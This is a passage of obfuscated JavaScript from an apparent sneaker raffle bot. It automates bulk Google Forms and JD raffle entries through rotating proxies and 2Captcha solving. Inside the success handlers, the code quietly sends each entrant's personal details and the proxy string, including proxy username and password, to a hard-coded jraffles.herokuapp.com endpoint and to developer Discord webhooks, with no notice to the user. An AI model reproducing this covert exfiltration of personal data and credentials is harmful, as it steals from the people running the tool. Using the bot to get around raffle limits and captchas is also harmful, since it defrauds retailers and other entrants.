                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x203DS\x20Failed')), _0x3b295d = '3DS\x20Error\x20' + _0x2eb59d;
                            var _0x5a1d3f = await _0x530ba6(_0x3986c1[_0x2132a2], _0x658d6b, 'dev', !![], _0x3b295d);
                            _0x201cee['errorDEV'] = { 'embeds': [_0x5a1d3f] };
                            _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x201cee['errorDEV']);
                            await _0x313aa7(_0x4190b7, _0x201cee['errorDEV']);
                            continue;
                        }
                        _0x5207fa(_0x3986c1[_0x2132a2], _0x658d6b), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x4c5e22 = _0x3986c1[_0x2132a2];
                        try {
                            prxdata = {
                                'username': _0x1544fc['replace']('#', ''),
                                'module': _0x658d6b['name'],
                                'entrydata': JSON['stringify'](_0x4c5e22),
                                'proxy': '' + _0x5e2aee[_0x2132a2]
                            };
                            var _0x131767 = JSON['stringify'](prxdata);
                            let _0x37a55e = { 'headers': { 'content-type': 'application/json' } };
                            await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x131767, _0x37a55e);
                        } catch (_0x1c31a6) {
                        }
                        if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                            try {
                                await _0x313aa7(_0x4a50c2['webhook'], _0x201cee['succesDEVMSG']);
                            } catch {
                            }
                        await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x201cee['succesDEVMSG']), await _0xb9a1a7(0xc8);
                        try {
                            await _0x313aa7(_0x40302c, _0x201cee['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x220283) {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20' + _0x220283), _0x3b295d = '' + _0x220283;
                        var _0x5a1d3f = await _0x530ba6(_0x3986c1[_0x2132a2], _0x658d6b, 'dev', !![], _0x3b295d);
                        _0x201cee['errorDEV'] = { 'embeds': [_0x5a1d3f] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x201cee['errorDEV']), await _0x313aa7(_0x4190b7, _0x201cee['errorDEV']), _0x2250f5 = 'yes';
                    } finally {
                        _0x59bc29['close']();
                        if (_0x2250f5 == 'yes' && _0x55631e != 0x5) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x658d6b['name'] + ']\x20Task\x20' + (_0x2132a2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55631e + '\x20/\x205)')), _0x2132a2 = _0x2132a2 - 0x1, _0x55631e = _0x55631e + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x361c4b, _0x491536, _0x2e78bc) {
                let _0x59f623 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x1d0bc7 = _0xf38118['readFileSync']('forms/templates.json', 'utf-8');
                let _0x2c1681 = JSON['parse'](_0x1d0bc7), _0x319833 = ![];
                if (_0x2c1681['length'] != 0x0) {
                    let _0x533a83 = 0x0;
                    for (template of _0x2c1681) {
                        if (template['Url'] == _0x491536[0x0]['Url']) {
                            _0x319833 = !![], console['log'](_0x5631d3['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x5631d3['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x5631d3['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x475123() {
                                let _0x8058ec = await _0x551dbb['get']('answer');
                                if (_0x8058ec['answer']['toLowerCase']() != 'y' && _0x8058ec['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x475123();
                                return _0x8058ec['answer']['toLowerCase']();
                            }
                            if (await _0x475123() == 'n') {
                                _0x2c1681['splice'](_0x533a83, 0x1), console['clear']();
                                break;
                            }
                            _0x59f623 = template, console['clear']();
                            break;
                        }
                        _0x533a83++;
                    }
                }
                let _0x458f25 = 0x0, _0x5cd74b = 0x0;
                function _0x50d30a(_0x5cffc3) {
                    console['log'](_0x5b6bc2() + '\x20[' + _0x361c4b['name'] + ']\x20Task\x20' + (_0x3661f7 + 0x1) + '\x20:\x20' + _0x5cffc3);
                }
                var _0x541775 = 0x0;
                for (key in _0x59f623) {
                    if (key['includes']('custom'))
                        _0x458f25++;
                    if (key['includes']('Select'))
                        _0x5cd74b++;
                }
                for (var _0x3661f7 = 0x0; _0x3661f7 < _0x491536['length']; _0x3661f7++) {
                    _0x59f623['Url'] = _0x491536[_0x3661f7]['Url'];
                    let _0x5d8a49 = ![];
                    if (_0x2c1681['length'] != 0x0)
                        for (template of _0x2c1681) {
                            if (template['Url'] == _0x491536[_0x3661f7]['Url']) {
                                _0x59f623 = template, _0x5d8a49 = !![], _0x50d30a('Found\x20Template');
                                break;
                            }
                        }
                    var _0x3d6380;
                    if (_0x4d750c != 'yes') {
                        if (!_0x4d750c)
                            var _0x4d750c = '';
                        else
                            _0x4d750c = '';
                        _0x541775 = 0x0;
                    }
                    try {
                        await _0x2dc03a(_0x491536, _0x3661f7);
                    } catch {
                        _0x4d750c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4a50c2['useRandomProxy'] = ![])
                        var _0x4e8d1f = _0x2e78bc[_0x3661f7]['split'](':');
                    else
                        var _0x4f6158 = Math['round'](Math['random']() * (_0x2e78bc['length'] - 0x1)), _0x4e8d1f = _0x2e78bc[_0x4f6158]['split'](':');
                    var _0x21da03;
                    if (_0x4e8d1f['length'] == 0x1)
                        try {
                            _0x21da03 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21da03 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x21da03 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e8d1f[0x0] + ':' + _0x4e8d1f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21da03 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e8d1f[0x0] + ':' + _0x4e8d1f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0xed9bdb = { 'first': ![] };
                        const _0x14e93e = await _0x21da03['newPage']();
                        if (_0x4e8d1f['length'] != 0x0)
                            await _0x14e93e['authenticate']({
                                'username': '' + _0x4e8d1f[0x2],
                                'password': '' + _0x4e8d1f[0x3]
                            });
                        _0x50d30a('Getting\x20Session');
                        let _0x3916b3 = ![];
                        try {
                            await _0x14e93e['goto'](_0x491536[_0x3661f7]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0xb9a1a7(0xbb8);
                        } catch (_0x1ecf7e) {
                            throw new Error(_0x1ecf7e);
                        }
                        const _0x572984 = await _0x14e93e['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x572984) {
                            _0x50d30a('Login\x20Detected');
                            let _0x261ed2 = await _0x572984['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x261ed2['click'](), _0x3916b3 = !![];
                        }
                        let _0x502bea = await _0x14e93e['$']('#identifierId');
                        _0x502bea && (_0x3916b3 = !![]);
                        await _0x14e93e['waitForSelector']('.teQAzf');
                        async function _0x1b7b13() {
                            let _0x5751b7 = await _0x14e93e['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x5751b7) {
                                let _0x515a4e;
                                try {
                                    _0x515a4e = await question['$eval']('.M7eMe', _0x3b27d7 => _0x3b27d7['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x458f25 != 0x0) {
                                    let _0x4c716a = ![];
                                    for (let _0x5e41d0 = 0x0; _0x5e41d0 < _0x458f25; _0x5e41d0++) {
                                        if (_0x515a4e == _0x59f623['custom' + _0x5e41d0]['title']) {
                                            _0x50d30a('Custom\x20Selector\x20found;\x20' + _0x515a4e);
                                            let _0x93b106 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x33f29a = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x93b106)
                                                await _0x93b106['type']('' + _0x59f623['custom' + _0x5e41d0]['answer']);
                                            else
                                                _0x33f29a && await _0x33f29a['type']('' + _0x59f623['custom' + _0x5e41d0]['answer']);
                                            _0x4c716a = !![];
                                            break;
                                        }
                                    }
                                    if (_0x4c716a) {
                                        await _0xb9a1a7(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x5cd74b != 0x0) {
                                    let _0xc383cb = ![];
                                    for (let _0x4e4e5c = 0x0; _0x4e4e5c < _0x5cd74b; _0x4e4e5c++) {
                                        if (_0x515a4e == _0x59f623[_0x4e4e5c + 'Select']['title']) {
                                            _0x50d30a('Custom\x20Selector\x20found;\x20' + _0x515a4e);
                                            let _0x5cbf14 = await question['$$']('.ulDsOb');
                                            for (opt of _0x59f623[_0x4e4e5c + 'Select']['answer']) {
                                                let _0x36ea8e = await _0x5cbf14[opt]['$']('span');
                                                await _0x36ea8e['click']();
                                            }
                                            _0xc383cb = !![];
                                            break;
                                        }
                                    }
                                    if (_0xc383cb) {
                                        await _0xb9a1a7(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x515a4e == _0x59f623['0Select']['title']) {
                                        _0x50d30a('Custom\x20Selector\x20found;\x20' + _0x59f623['0Select']['title']);
                                        let _0xf5e37a = await question['$$']('.ulDsOb'), _0x23ac30 = await _0xf5e37a[_0x59f623['0Select']['answer']];
                                        await _0x23ac30['click']();
                                        continue;
                                    }
                                    if (_0x515a4e == _0x59f623['1Select']['title']) {
                                        _0x50d30a('Custom\x20Selector\x20found;\x20' + _0x59f623['1Select']['title']);
                                        let _0x3f42e8 = await question['$$']('.ulDsOb'), _0x578f43 = await _0x3f42e8[_0x59f623['1Select']['answer']];
                                        await _0x578f43['click']();
                                        continue;
                                    }
                                    if (_0x515a4e == _0x59f623['2Select']['title']) {
                                        _0x50d30a('Custom\x20Selector\x20found;\x20' + _0x59f623['2Select']['title']);
                                        let _0x3be23b = await question['$$']('.ulDsOb'), _0x2b114f = await _0x3be23b[_0x59f623['2Select']['answer']];
                                        await _0x2b114f['click']();
                                        continue;
                                    }
                                } catch (_0x52d2c7) {
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('mail') && !_0x515a4e['toLowerCase']()['includes']('agree') || _0x515a4e == _0x59f623['Email']) {
                                    _0x50d30a('Mail\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x4472f9 = await question['$']('input');
                                    !_0x4472f9 && (_0x4472f9 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x4472f9['type'](_0x491536[_0x3661f7]['Email']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('first') || _0x515a4e['toLowerCase']() == 'name' || _0x515a4e['toLowerCase']() == 'name\x20' || _0x515a4e == _0x59f623['FirstName']) {
                                    _0x50d30a('FirstName\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x1f754e = await question['$']('input');
                                    !_0x1f754e && (_0x1f754e = await question['$']('textarea'));
                                    await _0x1f754e['type'](_0x491536[_0x3661f7]['FirstName'] + '\x20'), await _0xb9a1a7(0x258);
                                    if (_0x515a4e == _0x59f623['FirstName'])
                                        continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('last') || _0x515a4e['toLowerCase']()['includes']('surname') || _0x515a4e == _0x59f623['LastName']) {
                                    _0x50d30a('LastName\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x32e710 = await question['$']('input');
                                    !_0x32e710 && (_0x32e710 = await question['$']('textarea'));
                                    await _0x32e710['type'](_0x491536[_0x3661f7]['LastName'] + '\x20'), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('address') && !_0x515a4e['toLowerCase']()['includes']('agree') || _0x515a4e == _0x59f623['Address']) {
                                    _0x50d30a('Address\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x285e32 = await question['$']('input');
                                    !_0x285e32 && (_0x285e32 = await question['$']('textarea'));
                                    await _0x285e32['type'](_0x491536[_0x3661f7]['Address1'] + '\x20' + _0x491536[_0x3661f7]['HouseNumber'] + '\x20' + _0x491536[_0x3661f7]['Address2']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('phone') || _0x515a4e['toLowerCase']()['includes']('mobile') || _0x515a4e == _0x59f623['Phone']) {
                                    _0x50d30a('Phone\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x3f3fbd = await question['$']('input');
                                    !_0x3f3fbd && (_0x3f3fbd = await question['$']('textarea'));
                                    await _0x3f3fbd['type']('' + _0x491536[_0x3661f7]['Phone']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('country') || _0x515a4e == _0x59f623['Country']) {
                                    let _0x24e60c = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x24e60c) {
                                        let _0x2924b1 = ![], _0xfb0acd = await _0x24e60c['$$']('.ulDsOb');
                                        for (option of _0xfb0acd) {
                                            let _0x5d9271 = await option['$']('span'), _0x3f94a1 = await option['$eval']('span', _0x1f9b43 => _0x1f9b43['textContent']);
                                            if (_0x3f94a1['toLowerCase']() == _0x491536[_0x3661f7]['Country']['toLowerCase']()) {
                                                await _0x5d9271['click'](), _0x2924b1 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x2924b1) {
                                            const _0x124ed5 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x124ed5['click'](), await _0x124ed5['type'](_0x491536[_0x3661f7]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x50d30a('Country\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x28e672 = await question['$']('input');
                                    !_0x28e672 && (_0x28e672 = await question['$']('textarea'));
                                    await _0x28e672['type']('' + _0x491536[_0x3661f7]['Country']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('city') || _0x515a4e == _0x59f623['City']) {
                                    _0x50d30a('City\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x375d8c = await question['$']('input');
                                    !_0x375d8c && (_0x375d8c = await question['$']('textarea'));
                                    await _0x375d8c['type']('' + _0x491536[_0x3661f7]['City']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('zip') || _0x515a4e == _0x59f623['Zip']) {
                                    _0x50d30a('Zip\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x4aff24 = await question['$']('input');
                                    !_0x4aff24 && (_0x4aff24 = await question['$']('textarea'));
                                    await _0x4aff24['type']('' + _0x491536[_0x3661f7]['Zip']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('insta') || _0x515a4e == _0x59f623['Follower']) {
                                    _0x50d30a('Follower\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x52f4f3 = await question['$']('input');
                                    !_0x52f4f3 && (_0x52f4f3 = await question['$']('textarea'));
                                    await _0x52f4f3['type']('' + _0x491536[_0x3661f7]['Follower']), await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('size') || _0x515a4e == _0x59f623['Size']) {
                                    _0x50d30a('Size\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x3be79e = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x3be79e) {
                                        let _0x39c456 = await _0x3be79e['$$']('.ulDsOb');
                                        if (_0x491536[_0x3661f7]['Size']['toLowerCase']() == 'random') {
                                            var _0x24e4ef = Math['round'](Math['random']() * (_0x39c456['length'] - 0x1));
                                            await _0x39c456[_0x24e4ef]['click']();
                                        } else
                                            for (size of _0x39c456) {
                                                let _0x547fc8 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4d3489 => _0x4d3489['textContent']);
                                                if (_0x547fc8['toLowerCase']()['includes'](_0x491536[_0x3661f7]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x214eb5 = await question['$']('.ry3kXd');
                                    if (_0x214eb5) {
                                        await _0x214eb5['click'](), await _0xb9a1a7(0x9c4);
                                        let _0x4c215c = await _0x14e93e['$']('div[jsname=\x22V68bde\x22]'), _0x3a4699 = await _0x4c215c['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x3a4699) {
                                            let _0x8e9d0e = await size['$eval']('.vRMGwf.oJeWuf', _0x21d091 => _0x21d091['textContent']), _0x134d99 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x8e9d0e['toLowerCase']()['includes'](_0x491536[_0x3661f7]['Size'])) {
                                                await _0xb9a1a7(0x190), await _0x134d99['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('receive') || _0x515a4e['toLowerCase']()['includes']('method')) {
                                    _0x50d30a('Method\x20Selector\x20found;\x20' + _0x515a4e);
                                    let _0x4a8178 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x4a8178) {
                                        const _0x3a4b67 = await _0x4a8178['$$']('.ulDsOb');
                                        for (size of _0x3a4b67) {
                                            let _0x391cfc = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x36bd2d => _0x36bd2d['textContent']);
                                            if (_0x391cfc['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0xb9a1a7(0x258);
                                    continue;
                                }
                                if (_0x515a4e['toLowerCase']()['includes']('offers') || _0x515a4e['toLowerCase']()['includes']('agree')) {
                                    _0x50d30a('Authorization\x20Selector\x20found;\x20' + _0x515a4e);
                                    const _0x2b9a1e = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x2b9a1e) {
                                        const _0x573d2a = await _0x2b9a1e['$$']('.ulDsOb');
                                        for (size of _0x573d2a) {
                                            let _0x2dad2d = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x38bc6a => _0x38bc6a['textContent']);
                                            if (_0x2dad2d['toLowerCase']()['includes']('authorize') || _0x2dad2d['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0xb9a1a7(0x258);
                                    continue;
                                }
                                async function _0x1f8d0a() {
                                    let _0x4fb12c = await question['$']('.oyXaNc');
                                    if (_0x4fb12c) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5631d3['cyan'](_0x515a4e) + '\x0a');
                                        let _0x405486 = await question['$$']('.ulDsOb');
                                        for (let _0x518822 = 0x0; _0x518822 < _0x405486['length']; _0x518822++) {
                                            let _0x52501a = await _0x405486[_0x518822]['$eval']('span', _0xe53fb => _0xe53fb['textContent']);
                                            console['log']('\x20(' + _0x518822 + ')\x20' + _0x52501a);
                                        }
                                        console['log']();
                                        let _0x10fc99 = await _0x551dbb['get']('option'), _0x5861c7 = await _0x405486[_0x10fc99['option']]['$eval']('span', _0x534623 => _0x534623['textContent']);
                                        _0x59f623[_0x5cd74b + 'Select'] = {
                                            'title': _0x515a4e,
                                            'answer': _0x10fc99['option']['split'](',')
                                        };
                                        let _0x3195db = await _0x405486[_0x10fc99['option']]['$']('span');
                                        await _0x3195db['click'](), _0x5cd74b++;
                                        return;
                                    }
                                    let _0x40bb70 = await question['$']('.Y6Myld');
                                    if (_0x40bb70) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5631d3['cyan'](_0x515a4e) + '\x0a');
                                        let _0x199bbb = await question['$$']('.ulDsOb');
                                        for (let _0x17c56c = 0x0; _0x17c56c < _0x199bbb['length']; _0x17c56c++) {
                                            let _0x5c0150 = await _0x199bbb[_0x17c56c]['$eval']('span', _0xb114e2 => _0xb114e2['textContent']);
                                            console['log']('\x20(' + _0x17c56c + ')\x20' + _0x5c0150);
                                        }
                                        console['log']();
                                        let _0x323783 = await _0x551dbb['get']('option');
                                        _0x59f623[_0x5cd74b + 'Select'] = {
                                            'title': _0x515a4e,
                                            'answer': _0x323783['option']['split'](',')
                                        };
                                        for (opt of _0x59f623[_0x5cd74b + 'Select']['answer']) {
                                            let _0x9f12b = await _0x199bbb[opt]['$']('span');
                                            await _0x9f12b['click']();
                                        }
                                        _0x5cd74b++;
                                        return;
                                    }
                                    var _0x31ab24 = 0x0;
                                    let _0x1a8c0d = Object['keys'](_0x59f623);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x5631d3['cyan'](_0x515a4e) + '\x0a');
                                    for (data of _0x1a8c0d) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x31ab24 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x31ab24 + ')\x20' + data), _0x31ab24++;
                                    }
                                    console['log']('\x20(' + _0x1a8c0d['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x4a519a = await _0x551dbb['get']('input');
                                    if (_0x4a519a['input'] == _0x1a8c0d['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x470b12 = await _0x551dbb['get']('input');
                                        _0x59f623['custom' + _0x458f25] = {
                                            'title': _0x515a4e,
                                            'answer': '' + _0x470b12['input']
                                        };
                                        let _0x5a4dd4 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x32ecc5 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x5a4dd4)
                                            await _0x5a4dd4['type']('' + _0x59f623['custom' + _0x458f25]['answer']);
                                        else
                                            _0x32ecc5 && await _0x32ecc5['type']('' + _0x59f623['custom' + _0x458f25]['answer']);
                                        _0x458f25++;
                                        return;
                                    }
                                    _0x59f623['' + _0x1a8c0d[_0x4a519a['input']]] = _0x515a4e;
                                    let _0x29be1b = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x191c45 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x29be1b && await _0x29be1b['type']('' + _0x491536[_0x3661f7]['' + _0x1a8c0d[_0x4a519a['input']]]), _0x191c45 && await _0x191c45['type']('' + _0x491536[_0x3661f7]['' + _0x1a8c0d[_0x4a519a['input']]]), await _0xb9a1a7(0x258);
                                }
                                await _0x1f8d0a(), await _0xb9a1a7(0x37a);
                            }
                            let _0x4af690 = await _0x14e93e['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x4af690)
                                return await _0x4af690['click'](), await _0x14e93e['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x50d30a('New\x20Section'), _0x1b7b13();
                        }
                        await _0x1b7b13(), await _0x14e93e['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x14e93e['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x5207fa(_0x491536[_0x3661f7], _0x361c4b), _0x4d750c = 'no';
                        var _0x5859ab = await _0x530ba6(_0x491536[_0x3661f7], _0x361c4b, 'dev', ![]), _0x2e823d = await _0x530ba6(_0x491536[_0x3661f7], _0x361c4b, 'pub', ![]);
                        let _0x44258f = _0x491536[_0x3661f7];
                        try {
                            prxdata = {
                                'username': _0x1544fc['replace']('#', ''),
                                'module': _0x361c4b['name'],
                                'entrydata': JSON['stringify'](_0x44258f),
                                'proxy': '' + _0x2e78bc[_0x3661f7]
                            };
                            var _0x6b4caf = JSON['stringify'](prxdata);
                            let _0x51bef0 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x6b4caf, _0x51bef0);
                        } catch (_0xf0da51) {
                        }
                        const _0x4ac202 = {
                            'succesDEVMSG': { 'embeds': [_0x5859ab] },
                            'succesPUBMSG': { 'embeds': [_0x2e823d] }
                        };
                        try {
                            _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x4ac202['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x4ac202['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x4ac202['succesPUBMSG']);
                        } catch (_0x4d1f98) {
                            console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x3661f7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4d1f98));
                        }
                        console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x361c4b['name'] + ']\x20Task\x20' + (_0x3661f7 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x458f25 != 0x0 || _0x5cd74b != 0x0 && !_0x5d8a49) && (_0x2c1681['push'](_0x59f623), _0xf38118['writeFileSync']('forms/templates.json', JSON['stringify'](_0x2c1681, null, 0x2), 'utf-8'));
                    } catch (_0x4eedbe) {
                        console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x361c4b['name'] + ']\x20Task\x20' + (_0x3661f7 + 0x1) + '\x20:\x20' + _0x4eedbe)), _0x3d6380 = '' + _0x4eedbe;
                        var _0x28a24 = await _0x530ba6(_0x491536[_0x3661f7], _0x361c4b, 'dev', !![], _0x3d6380);
                        let _0x2bf377 = {};
                        _0x2bf377['errorDEV'] = { 'embeds': [_0x28a24] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x2bf377['errorDEV']), await _0x313aa7(_0x4190b7, _0x2bf377['errorDEV']), _0x4d750c = 'yes';
                    } finally {
                        _0x21da03 && _0x21da03['close']();
                        if (_0x4d750c == 'yes' && _0x541775 != 0x5) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x361c4b['name'] + ']\x20Task\x20' + (_0x3661f7 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x541775 + 0x1) + '\x20/\x205)')), _0x3661f7--, _0x541775++;
                            continue;
                        }
                        if (_0x4d750c == 'yes' && _0x541775 == 0x5) {
                            _0x541775 = 0x0, _0x4d750c = 'no';
                            continue;
                        }
                        _0x50d30a('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x47ffd7, _0x508b2b, _0x12a4af) {
                var _0x12f313 = ![], _0x4adabe = ![];
                if (_0x4a50c2['captchaKey'] == '' || _0x4a50c2['captchaKey'] == undefined)
                    return console['log'](_0x5631d3['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a50c2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5277f6 = 0x0; _0x5277f6 < _0x508b2b['length']; _0x5277f6++) {
                    if (_0x331a22 != 'yes')
                        var _0x331a22 = '', _0x4ab1d6 = 0x0;
                    var _0x4a6669, _0x3cc851 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
